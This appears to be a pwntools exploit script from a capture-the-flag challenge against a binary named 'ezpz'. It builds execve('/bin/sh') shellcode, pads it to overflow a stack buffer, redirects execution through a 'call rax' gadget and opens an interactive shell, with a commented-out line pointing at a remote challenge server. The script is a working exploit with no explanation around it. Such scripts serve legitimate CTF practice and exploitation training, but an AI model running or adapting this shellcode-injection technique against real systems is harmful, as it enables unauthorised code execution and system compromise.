from pwn import *
elf = context.binary = ELF("./ezpz")
r = elf.process()
gdb.attach(r, '''
    b*vuln+31\n
    c
''')
# r = remote("3.110.66.92", 32001)
shellcode = asm('''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ''', arch = 'amd64')
call_rax = 0x0000000000401014
payload = shellcode.ljust(40,b"\0") + p64(call_rax)
r.sendline(payload)

r.interactive()